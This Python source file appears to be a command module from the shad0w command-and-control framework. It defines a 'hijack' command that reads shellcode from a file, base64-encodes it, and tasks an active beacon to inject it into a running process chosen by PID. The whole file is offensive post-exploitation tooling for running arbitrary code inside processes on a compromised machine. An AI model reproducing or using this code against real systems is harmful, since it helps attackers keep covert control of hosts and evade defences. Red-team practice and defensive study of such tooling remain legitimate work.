#
# Hijack the execution of a process
#

import base64
import os
import json

__description__ = "Hijack a running process and force it to run your shellcode"
__author__ = "@_batsec_"

# identify the task as shellcode execute
from lib.basecommand import BaseCommand

SHINJECT_EXEC_ID = 0x2000


def build_inject_info(args, rcode):
    # create the json object to tell the beacon
    # where to execute the code.

    info = {"pid": int(args.pid), "data": rcode}

    return json.dumps(info)


def get_file_data(filename):
    # get the data from the file

    # so we are in the bridge
    bdir = os.getcwd()
    os.chdir("/opt/shad0w/.bridge")

    try:
        with open(filename, 'rb') as file:
            data = file.read()
    except FileNotFoundError:
        return None

    # hop back to where we where before
    os.chdir(bdir)

    return base64.b64encode(data).decode()


class HijackCommand(BaseCommand):
    def __init__(self, args):
        BaseCommand.__init__(self, "hijack", args)

    def parse_parameters(self):
        self.parser.add_argument("-p", "--pid", required=True, help="PID of the process")
        self.parser.add_argument("-f", "--file", required=True, help="File containing the shellcode")

    def get_usage(self):
        return """

Examples:

hijack -p 4267 -f shellcode.bin
"""

    def run(self, shad0w):
        rcode = get_file_data(self.args.file)
        if rcode is None:
            shad0w.debug.error(f"Shellcode file '{self.args.file}' does not exist")
            return

        inject_info = build_inject_info(self.args, rcode)

        shad0w.beacons[shad0w.current_beacon]["task"] = (SHINJECT_EXEC_ID, inject_info)


def main(shad0w, args):
    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.log("ERROR: No active beacon", log=True)
        return

    cmd = HijackCommand(args)
    if cmd.parse() is True:
        cmd.run(shad0w)

    return
